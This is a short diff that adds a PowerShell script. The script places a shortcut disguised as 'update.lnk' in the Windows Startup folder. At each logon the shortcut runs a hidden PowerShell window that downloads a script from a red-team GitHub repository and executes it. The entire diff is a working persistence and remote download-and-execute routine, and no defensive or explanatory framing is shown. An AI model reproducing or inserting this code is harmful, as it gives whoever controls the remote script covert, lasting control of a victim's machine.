@@ -1,0 +1,6 @@
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk")
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = '-WindowStyle Hidden -c "iwr https://raw.githubusercontent.com/ferreirasc/redteam-arsenal/master/arsenal/p.ps1 -OutFile $env:localappdata\p.ps1; iex (Get-Content $env:localappdata\p.ps1 -Raw)"'
+$shortcut.WorkingDirectory = "C:\Windows\System32"
+$shortcut.Save()
